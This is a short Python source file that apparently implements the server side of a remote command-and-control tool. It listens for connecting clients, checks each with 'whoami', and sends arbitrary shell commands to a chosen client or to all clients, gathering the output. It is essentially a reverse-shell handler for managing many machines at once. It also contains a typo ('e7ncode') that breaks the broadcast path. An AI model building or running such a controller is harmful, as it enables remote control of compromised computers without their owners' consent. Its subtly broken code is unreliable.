import time
from socket import *

clients = []

#Class that connects the clients to the server via sockets and allows the server to run commands on the clients
class SocketConnection:
    def __init__(self, lhost, lport, litsten_no):
        self.lhost = lhost
        self.lport = lport
        self.listen_no = litsten_no

        try:
            self.server = socket(AF_INET, SOCK_STREAM)
            self.server.bind((lhost, lport))
            self.server.listen(litsten_no)

            print("Server Started")

        except Exception as e:
            print("Error starting server:", e)

    def client_manager(self):
        while True:
            client, addr = self.server.accept()
            start_time = time.time()
            clients.append([client,addr, start_time])
            print("Client {0} connected".format(addr))


    def get_all_clients(self):
        for client in clients:
            try:
                client_socket = client[0]
                client_socket.sendall("whoami".encode())
                result = client_socket.recv(2048).decode()

            except Exception as e:
                clients.remove(client)

        return clients

    def run_command(self, *args):
        try:
            result_list = []
            target = args[0]            #this variable shows if the target is a single client or all clients
            command = args[1]

            if target == "all":

                for client in clients:
                    client_socket = client[0]
                    client_socket.sendall(command.e7ncode())
                    result = client_socket.recv(2048).decode()
                    result_dict = {"client":client[1][0], "result":result}
                    result_list.append(result_dict)

            else:
                client_ip_address = args[2]

                for client in clients:
                    if client[1][0] == client_ip_address:
                        client_socket = client[0]
                        client_socket.sendall(command.encode())
                        result = client_socket.recv(2048).decode()
                        result_dict = {"client": client[1][0], "result": result}
                        result_list.append(result_dict)

            return result_list

        except Exception as e:
            return "Error running commands: ", e

